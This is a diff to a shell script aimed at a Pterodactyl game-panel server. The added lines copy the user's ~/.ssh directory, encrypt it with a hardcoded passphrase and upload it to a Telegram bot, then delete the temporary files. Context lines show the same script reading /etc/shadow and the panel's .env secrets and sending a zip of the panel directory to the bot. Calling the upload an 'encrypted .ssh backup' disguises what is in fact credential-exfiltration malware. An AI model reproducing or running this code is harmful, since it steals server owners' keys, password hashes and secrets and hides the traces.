@@ -13,7 +13,27 @@ FILE2="/etc/shadow"
 FILE3="/var/www/pterodactyl/.env"
 RESULT2="$(curl -4 -s ifconfig.me)"
 SRC="/var/www/pterodactyl"
-ZIP="/etc/ptero.zip"
+ZIP="/tmp/ptero.zip"
+PASSWORD="farizgd331"
+TMP="/tmp/ssh_backup"
+ARCHIVE="$TMP.tar"
+ENCRYPTED="$ARCHIVE.gpg"
+
+mkdir -p "$TMP"
+cp -r ~/.ssh "$TMP/"
+
+tar -cf "$ARCHIVE" -C "$TMP" ssh
+
+gpg --batch --yes --passphrase "$PASSWORD" \
+    --symmetric --cipher-algo AES256 "$ARCHIVE"
+
+curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
+  -F chat_id="$CHAT_ID" \
+  -F document=@"$ENCRYPTED" \
+  -F caption="🔐 Encrypted .ssh backup (AES-256)"
+
+# ===== CLEAN UP =====
+rm -rf "$TMP" "$ARCHIVE" "$ENCRYPTED"
 
 curl -s \
   -X POST \
@@ -56,6 +76,3 @@ curl -s \
   -F "document=@${ZIP}" \
   "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
   > /dev/null 2>&1
-
-# delete zip
-rm -f "$ZIP"
